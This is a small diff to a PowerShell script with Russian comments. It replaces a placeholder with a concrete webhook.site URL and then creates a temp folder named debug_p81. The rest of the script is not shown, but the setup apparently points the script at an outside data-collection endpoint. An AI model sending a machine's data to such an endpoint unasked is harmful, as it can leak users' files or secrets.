@@ -9,7 +9,7 @@ try {
 }
 
 # 2. Твой URL (замени на актуальный!)
-$url = "ВСТАВЬ_СЮДА_URL_С_WEBHOOK_SITE"
+$url = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"
 
 # 3. Создание папки
 $tmp = "$env:TEMP\debug_p81"
